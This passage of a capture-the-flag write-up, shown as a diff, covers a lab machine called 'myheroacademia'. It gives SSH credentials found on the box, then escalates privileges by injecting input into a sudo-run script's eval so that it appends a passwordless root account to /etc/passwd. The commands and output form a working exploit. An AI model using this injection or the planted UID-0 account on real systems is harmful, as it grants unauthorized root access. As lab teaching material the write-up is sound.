@@ -122,8 +122,71 @@ www-data@myheroacademia:/var/www/Hidden_Content$
 
 + Read file and we've gotten the credential SSH of user deku.
 
+--> deku:One?For?All_!!one1/A
 
++ Login SSH with credential we've found:
 
+![alt text](image-11.png)
 
+## Privilege Escalation ##
 
+```bash
+deku@myheroacademia:~$ sudo -l
+[sudo] password for deku: 
+Matching Defaults entries for deku on myheroacademia:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
+User deku may run the following commands on myheroacademia:
+    (ALL) /opt/NewComponent/feedback.sh
+```
+
++ Check the file bash:
+
+```bash
+if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
+    echo "It is This:"
+    eval "echo $feedback"
+
+    echo "$feedback" >> /var/log/feedback.txt
+    echo "Feedback successfully saved."
+else
+    echo "Invalid input. Please provide a valid input." 
+```
+--> $feedback will don't accept these characters if we input them.
+```
+ \ \$( ) | & ; ? ! 
+```
+
++ Run file feedback.sh with sudo:
+
+![alt text](image-12.png)
+
+--> We are able to create new file with feedback.sh and the important is file that is root permission.
+
++ Idea: Alternatively we can use the following lines to add a dummy user without a password by feedback.sh
+
+```bash
+deku@myheroacademia:/opt/NewComponent$ sudo ./feedback.sh 
+Hello, Welcome to the Report Form       
+This is a way to report various problems
+    Developed by                        
+        The Technical Department of U.A.
+Enter your feedback:
+dummy::0:0::/root:/bin/bash >> /etc/passwd
+It is This:
+Feedback successfully saved.
+deku@myheroacademia:/opt/NewComponent$ cat /etc/passwd
+...
+dummy::0:0::/root:/bin/bash
+```
+
+```bash
+deku@myheroacademia:/opt/NewComponent$ su -p dummy
+root@myheroacademia:/opt/NewComponent# id
+uid=0(root) gid=0(root) groups=0(root)
+root@myheroacademia:/opt/NewComponent# cd /root
+root@myheroacademia:/root# ls
+root.txt  snap
+```
+END!!!
